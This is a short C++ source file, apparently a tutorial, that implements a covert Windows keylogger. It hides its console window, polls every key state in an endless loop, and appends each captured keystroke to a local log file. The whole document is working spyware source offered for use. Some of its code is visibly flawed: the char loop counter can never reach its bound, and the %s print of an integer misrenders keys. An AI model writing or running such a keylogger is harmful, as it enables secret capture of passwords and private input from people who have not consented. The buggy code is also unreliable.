// Step 1: Including header files to get standard functions.

#include <iostream>
#include <Windows.h>

using namespace std;

// Step 2: Declaring Global calls.

int Save(int _key, char *file);


//Step 3: Main Code.

int main() {
 
 FreeConsole();

char i;

while (true) {
 Sleep(10);
 for (i = 8; i <= 255; i++) {
 if (GetAsyncKeyState(i) == -32767) {
     
// saving the output in a text file
     
 Save(i, "log.txt");
 }
 }
 }
 return 0;
}

// Step 4: Storing Captured Key Strokes.

int Save(int _key, char *file) {

cout << _key << endl;

Sleep(10);

FILE *OUTPUT_FILE;

OUTPUT_FILE = fopen(file, "a+");

if (_key == VK_SHIFT)
 fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
 else if (_key == VK_BACK)
 fprintf(OUTPUT_FILE, "%s", "[BACK]");
 else if (_key == VK_LBUTTON)
 fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
 else if (_key == VK_RETURN)
 fprintf(OUTPUT_FILE, "%s", "[RETURN]");
 else if (_key == VK_ESCAPE)
 fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
 else
 fprintf(OUTPUT_FILE, "%s", &_key);

fclose(OUTPUT_FILE);

return 0;
}
